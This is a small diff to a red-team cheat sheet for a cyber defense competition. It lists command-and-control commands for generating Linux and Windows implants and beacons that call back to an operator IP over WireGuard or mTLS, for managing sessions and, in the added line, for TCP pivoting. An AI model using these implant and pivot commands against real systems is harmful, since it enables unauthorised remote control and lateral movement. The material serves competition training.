@@ -125,6 +125,7 @@ pagetitle: Red Teaming for CCDC
   - `generate --wg {our_IP} --os linux` for an implant
   - `generate beacon --wg 192.168.0.102 -j {jitter} -S {wait_seconds} --os linux` 
   - Windows: `generate --mtls 192.168.0.102 --os windows` 
+  - If we need to pivot, use `--tcp-pivot {IP}` and then we can see our pivots with `pivots tcp`
 - `sessions` to show active sessions
   - `sessions -i {id}` to interact with session
     - `CTRL + d` to exit
